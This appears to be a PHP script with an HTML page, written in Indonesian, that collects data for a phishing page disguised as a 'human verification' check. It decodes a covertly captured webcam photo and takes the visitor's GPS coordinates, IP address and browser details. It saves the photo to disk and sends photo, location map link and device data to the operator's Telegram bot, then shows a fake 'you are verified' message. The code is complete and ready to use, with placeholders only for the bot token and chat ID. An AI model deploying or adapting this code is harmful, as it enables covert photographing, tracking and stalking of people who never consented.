<?php
// Buatan Algaza IG @cosplaysulit

// Set zona waktu ke Asia/Jakarta
// Buatan Algaza IG @cosplaysulit
date_default_timezone_set('Asia/Jakarta');

// Fungsi untuk mendapatkan IP pengguna
// Buatan Algaza IG @cosplaysulit
function getUserIP() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP']; // IP asli dari Cloudflare
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ipList[0]); // Ambil IP pertama (visitor asli)
    } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Fungsi untuk mendapatkan detail User-Agent
// Buatan Algaza IG @cosplaysulit
function getUserAgentDetails() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $browser = "Unknown";
    $os = "Unknown";

    if (preg_match('/linux/i', $userAgent)) {
        $os = "Linux";
    } elseif (preg_match('/macintosh|mac os x/i', $userAgent)) {
        $os = "Mac OS";
    } elseif (preg_match('/windows|win32/i', $userAgent)) {
        $os = "Windows";
    }

    if (preg_match('/MSIE|Trident/i', $userAgent)) {
        $browser = "Internet Explorer";
    } elseif (preg_match('/Firefox/i', $userAgent)) {
        $browser = "Mozilla Firefox";
    } elseif (preg_match('/Chrome/i', $userAgent)) {
        $browser = "Google Chrome";
    } elseif (preg_match('/Safari/i', $userAgent)) {
        $browser = "Safari";
    } elseif (preg_match('/Opera/i', $userAgent)) {
        $browser = "Opera";
    }

    return [
        'ip' => getUserIP(),
        'browser' => $browser,
        'os' => $os,
        'user_agent' => $userAgent
    ];
}

// Ambil data POST
// Buatan Algaza IG @cosplaysulit
$nama = $_POST['nama'] ?? 'Tidak Diketahui';
$alamat = $_POST['alamat'] ?? 'Tidak Diketahui';
$gps = $_POST['gps'] ?? 'Tidak Ada';
$userInfo = getUserAgentDetails();
$ip = $userInfo['ip'];

$photoData = $_POST['photo'] ?? null;

// Cek apakah foto ada
// Buatan Algaza IG @cosplaysulit
if (!$photoData) {
    header("location: /");
    exit();
}

// Decode foto dari base64
// Buatan Algaza IG @cosplaysulit
$photoData = str_replace('data:image/jpeg;base64,', '', $photoData);
$photoData = base64_decode($photoData);

// Simpan gambar di folder /cam/
// Buatan Algaza IG @cosplaysulit
$filename = 'cam/' . time() . '_' . rand(1000, 9999) . '.jpg';
file_put_contents($filename, $photoData);

// Token dan Chat ID Telegram
// Buatan Algaza IG @cosplaysulit
$token = 'Token_Telegram_Mu';
$chat_id = 'Chat_ID_MU';

// Buat Link Google Maps
// Buatan Algaza IG @cosplaysulit
$gpsLink = "https://www.google.com/maps/search/?api=1&query=" . urlencode($gps);

$caption = "\uD83D\uDCCC *Laporan* \uD83D\uDCCC\n"
    . "\uD83D\uDC64 $nama\n"
    . "\uD83D\uDCCD $alamat\n"
    . "\uD83C\uDF0D [$gps]($gpsLink)\n"
    . "\uD83C\uDF10 $ip | \uD83D\uDDA5 {$userInfo['os']} | \uD83C\uDF10 {$userInfo['browser']}";

// Kirim Foto ke Telegram
// Buatan Algaza IG @cosplaysulit
if (file_exists($filename)) {
    $telegram_url_photo = "https://api.telegram.org/bot$token/sendPhoto";
    $post_fields_photo = [
        'chat_id' => $chat_id,
        'photo' => new CURLFile(realpath($filename)),
        'caption' => $caption,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegram_url_photo);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields_photo);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// Kirim Lokasi ke Telegram
// Buatan Algaza IG @cosplaysulit
if ($gps !== 'Tidak Ada' && strpos($gps, ',') !== false) {
    list($latitude, $longitude) = explode(',', $gps);
    
    $telegram_url_location = "https://api.telegram.org/bot$token/sendLocation";
    $post_fields_location = [
        'chat_id' => $chat_id,
        'latitude' => $latitude,
        'longitude' => $longitude
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegram_url_location);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields_location);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css">
</head>
<body class="bg-dark text-white">
    <div class="container mt-5">
        <div class="card shadow bg-secondary">
            <div class="card-header bg-success text-white text-center">
                <h4>Kamu sudah diverifikasi</h4>
            </div>
            <div class="card-body text-center">
                <p>Terima kasih <strong><?php echo htmlspecialchars($nama); ?></strong>, anda telah terverifikasi sebagai human.</p>
                
                <a href="<?= htmlspecialchars($alamat); ?>" class="btn btn-primary mt-3">Lanjutkan ke LINK</a>
            </div>
            <div class="card-footer text-center text-light">
                <small>&copy; 2025 Algaza.my.id</small>
            </div>
        </div>
    </div>
</body>
</html>